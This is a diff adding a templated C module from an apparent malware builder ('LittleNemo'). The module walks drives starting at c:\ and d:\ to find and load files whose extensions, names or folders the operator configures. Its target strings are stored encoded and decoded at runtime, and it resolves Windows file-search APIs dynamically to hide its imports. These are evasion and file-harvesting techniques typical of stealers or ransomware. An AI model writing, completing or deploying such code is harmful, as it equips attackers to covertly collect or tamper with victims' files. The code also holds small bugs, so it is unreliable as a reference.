@@ -1,0 +1,289 @@
+#!name##LilNemo_CandyFile_C
+#!itemType##sfile
+#!info##LittleNemo Candy File C file.
+#!lang##c
+#!addNameComp##True
+#!Var##LHK_fext##_NULL##File extensions to search for. Separate extensions with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
+#!Var##LHK_fname##_NULL##Names of target files to search for. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
+#!Var##LHK_dname##_NULL##Names of directories to search. If any of the specified directories is not found starting from the search position, the search is terminated. Separate names with commas ",". Leaving this field empty will cause this criterion to be ignored by the filters.##str
+#!Var##LHK_spath##c:\, d:\##Initial paths to the directories from which the search will begin. For example: ‘c:\’, ‘c:\documents’, etc. Separate extensions with commas ",".##str
+
+
+{% set _NEMO_FILE_FEXT = _LNSHADOW.convertToList(LHK_fext, ",") %}
+{% set _NEMO_FILE_FNAME = _LNSHADOW.convertToList(LHK_fname, ",") %}
+{% set _NEMO_FILE_DNAME = _LNSHADOW.convertToList(LHK_dname, ",") %}
+{% set _NEMO_FILE_SPATH = _LNSHADOW.convertToList(LHK_spath, ",") %}
+
+#include "lil_nemo_candy_file.h"
+
+#include <stdio.h>
+
+static void fbfClearFileBag(pLIL_NEMO_FILE_BASIC fbag) {
+    fbag->bag->clear(fbag->bag);
+    if (fbag->file_ext != 0) {
+        for (int i=0; i<fbag->file_ext_size; i++) {
+            if (fbag->file_ext[i] != 0) {
+                free(fbag->file_ext[i]);
+            }
+        }
+        free(fbag->file_ext);
+    }
+    if (fbag->dir_name != 0) {
+        for (int i=0; i<fbag->dir_name_size; i++) {
+            if (fbag->dir_name[i] != 0) {
+                free(fbag->dir_name[i]);
+            }
+        }
+        free(fbag->dir_name);
+    }
+    if (fbag->file_name != 0) {
+        for (int i=0; i<fbag->file_name_size; i++) {
+            if (fbag->file_name[i] != 0) {
+                free(fbag->file_name[i]);
+            }
+        }
+        free(fbag->file_name);
+    }
+    if (fbag->start_path != 0) {
+        for (int i=0; i<fbag->start_path_size; i++) {
+            if (fbag->start_path[i] != 0) {
+                free(fbag->start_path[i]);
+            }
+        }
+        free(fbag->start_path);
+    }
+    free(fbag);
+}
+
+
+
+BYTE* fbLoadFile(char *fpath, DWORD *size_var) {
+    FILE *tar_file = fopen(fpath, "rb");
+    if (!tar_file) {
+        return NULL;
+    }
+    fseek(tar_file, 0, SEEK_END);
+    DWORD size = ftell(tar_file);
+    fseek(tar_file, 0, SEEK_SET);
+
+    BYTE *buff = malloc(size);
+    fread(buff, 1, size, tar_file);
+    fclose(tar_file);
+    *size_var = size;
+    return buff;
+}
+
+void fbWalkDir(char *start_path, pLIL_NEMO_FILE_BASIC fbag, NNType_NemoDirProcFunc func_dir, NNType_NemoFileProcFile process_file) {
+    char *dir_path = malloc(NEMO_BFILE_PATH_BUFF_SIZE);
+    memset(dir_path, 0, NEMO_BFILE_PATH_BUFF_SIZE);
+    snprintf(dir_path, NEMO_BFILE_PATH_BUFF_SIZE, "%s\\*", start_path);
+    WIN32_FIND_DATAA find_data;
+    HANDLE fhandle = fbag->firstFile(dir_path, &find_data);
+    if (fhandle == INVALID_HANDLE_VALUE) {
+        goto L_CLEAR;
+    }
+    char *full_path = malloc(NEMO_BFILE_PATH_BUFF_SIZE);
+    memset(full_path, 0, NEMO_BFILE_PATH_BUFF_SIZE);
+    do {
+        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
+            continue;
+        }
+        memset(full_path, 0, NEMO_BFILE_PATH_BUFF_SIZE);
+        snprintf(full_path, NEMO_BFILE_PATH_BUFF_SIZE, "%s\\%s", start_path, find_data.cFileName);
+        if (find_data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
+            if (func_dir(full_path, find_data.cFileName, fbag) == 1) {
+                fbWalkDir(full_path, fbag, func_dir, process_file);
+            }
+            continue;
+        }    
+        else {
+            process_file(full_path, find_data.cFileName, fbag);
+        }
+            
+    } while (fbag->nextFile(fhandle, &find_data) != 0);
+
+    free(full_path);
+
+    L_CLEAR:
+        free(dir_path);
+}
+
+
+
+void fbfDecodeText(uint16_t *src_data, uint16_t src_size, char *dest_buff, pLIL_NEMO_BAG bag) {
+    int data_size = src_size / sizeof(uint16_t);
+    memset(dest_buff, 0, data_size);
+    int key_id = 0;
+    for (int i=0; i<data_size; i++) {
+        if (bag->str_key[key_id] == 0) {
+            key_id = 0;
+        }
+        dest_buff[i] = src_data[i] - bag->str_key[key_id];
+        key_id++;
+    }
+}
+
+void fbsGetFileExt(pLIL_NEMO_FILE_BASIC fbag) {
+    {{_LNSHADOW.encodeList(_NEMO_FILE_FEXT)}}
+
+    if (data_size == 0) {
+        fbag->file_ext = 0;
+        fbag->file_ext_size = 0;
+        return;
+    }
+
+    char **file_ext = malloc(data_size * sizeof(char*));
+    memset(file_ext, 0, data_size * sizeof(char*));
+    for (int i=0; i<data_size; i++) {
+        char *single_ext = malloc(all_size[i] * sizeof(char));
+        memset(single_ext, 0, all_size[i] * sizeof(char));
+        fbfDecodeText(all_addr[i], all_size[i], single_ext, fbag->bag);
+        file_ext[i] = single_ext;
+    }
+    fbag->file_ext_size = data_size;
+    fbag->file_ext = file_ext;
+
+}
+
+void fbsGetFileName(pLIL_NEMO_FILE_BASIC fbag) {
+    {{_LNSHADOW.encodeList(_NEMO_FILE_FNAME)}}
+
+    if (data_size == 0) {
+        fbag->file_name = 0;
+        fbag->file_name_size = 0;
+        return;
+    }
+
+    char **file_ext = malloc(data_size * sizeof(char*));
+    memset(file_ext, 0, data_size * sizeof(char*));
+    for (int i=0; i<data_size; i++) {
+        char *single_ext = malloc(all_size[i] * sizeof(char));
+        memset(single_ext, 0, all_size[i] * sizeof(char));
+        fbfDecodeText(all_addr[i], all_size[i], single_ext, fbag->bag);
+        file_ext[i] = single_ext;
+    }
+    fbag->file_name_size = data_size;
+    fbag->file_name = file_ext;
+}
+
+void fbsGetDirName(pLIL_NEMO_FILE_BASIC fbag) {
+    {{_LNSHADOW.encodeList(_NEMO_FILE_DNAME)}}
+
+    if (data_size == 0) {
+        fbag->dir_name = 0;
+        fbag->dir_name_size = 0;
+        return;
+    }
+
+    char **file_ext = malloc(data_size * sizeof(char*));
+    memset(file_ext, 0, data_size * sizeof(char*));
+    for (int i=0; i<data_size; i++) {
+        char *single_ext = malloc(all_size[i] * sizeof(char));
+        memset(single_ext, 0, all_size[i] * sizeof(char));
+        fbfDecodeText(all_addr[i], all_size[i], single_ext, fbag->bag);
+        file_ext[i] = single_ext;
+    }
+    fbag->dir_name_size = data_size;
+    fbag->dir_name = file_ext;
+
+}
+
+void fbsGetStartPath(pLIL_NEMO_FILE_BASIC fbag) {
+    {{_LNSHADOW.encodeList(_NEMO_FILE_SPATH)}}
+
+    if (data_size == 0) {
+        fbag->dir_name = 0;
+        fbag->dir_name_size = 0;
+        return;
+    }
+
+    char **spath = malloc(data_size * sizeof(char*));
+    memset(spath, 0, data_size * sizeof(char*));
+    for (int i=0; i<data_size; i++) {
+        char *single_spath = malloc(all_size[i] * sizeof(char));
+        memset(single_spath, 0, all_size[i] * sizeof(char));
+        fbfDecodeText(all_addr[i], all_size[i], single_spath, fbag->bag);
+        spath[i] = single_spath;
+    }
+    fbag->start_path_size = data_size;
+    fbag->start_path = spath;
+}
+
+
+
+int fbCheckFileExt(const char* file_ext, pLIL_NEMO_FILE_BASIC fbag) {
+    if (fbag->file_ext == 0) {
+        return 1;
+    }
+    int result = 0;
+    for (int i=0; i<fbag->file_ext_size; i++) {
+        result = strcmp(file_ext, fbag->file_ext[i]);
+        if (result == 0) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int fbCheckDirName(char *dir_name, pLIL_NEMO_FILE_BASIC fbag) {
+    if (fbag->dir_name == 0) {
+        return 1;
+    }
+    int result = 0;
+    for (int i=0; i<fbag->dir_name_size; i++) {
+        result = strcmp(dir_name, fbag->dir_name[i]);
+        if (result == 0) {
+            return 1;
+        }
+    }
+    return 0;
+}
+
+int fbCheckFileName(char *file_name, pLIL_NEMO_FILE_BASIC fbag) {
+    if (fbag->file_name == 0) {
+        return 1;
+    }
+    char *fname = strdup(file_name);
+    char *fext = strrchr(fname, '.');
+    if (fext != NULL) {
+        *fext = '\0';
+    }
+    int result;
+    for (int i=0; i<fbag->file_name_size; i++) {
+        result = strcmp(fname, fbag->file_name[i]);
+        if (result == 0) {
+            free(fname);
+            return 1;
+        }
+    }
+    free(fname);
+    return 0;
+}
+
+pLIL_NEMO_FILE_BASIC fbMakeFileBag(uint16_t *ekey, uint16_t *str_key) {
+    pLIL_NEMO_BAG bag = lil_nemo_bag_prepareNemo(ekey, str_key, 0, NEMO_BFILE_BALLOC_SIZE, 0, NEMO_BFILE_BAG_BUFF_SIZE, 0, NEMO_BFILE_BAG_BUFF_SIZE, 0, NEMO_BFILE_BAG_BUFF_SIZE);
+    pLIL_NEMO_FILE_BASIC fbag = malloc(sizeof(LIL_NEMO_FILE_BASIC));
+    memset(fbag, 0, sizeof(LIL_NEMO_FILE_BASIC));
+    fbag->bag = bag;
+    fbag->clear = fbfClearFileBag;
+    void *k32 = bag->find_dll(bag->raw_k32, bag);
+    if (k32 == 0) {
+        goto L_RETURN_NULL;
+    }
+    fbag->firstFile = bag->get_func2(lil_nemo_food_FindFirstFileA, k32, bag);
+    fbag->nextFile = bag->get_func2(lil_nemo_food_FindNextFileA, k32, bag);
+    void *shlw = bag->load_ldr_dll(lil_nemo_food_Shlwapi_dll, bag);
+    if (shlw == 0) {
+        goto L_RETURN_NULL;
+    }
+    fbag->findExt = bag->get_func2(lil_nemo_food_PathFindExtensionA, shlw, bag);
+    fbsGetFileExt(fbag);
+    fbsGetFileName(fbag);
+    fbsGetDirName(fbag);
+    fbsGetStartPath(fbag);
+    return fbag;
+
+    L_RETURN_NULL:
+        fbfClearFileBag(fbag);
+        return 0;
+}
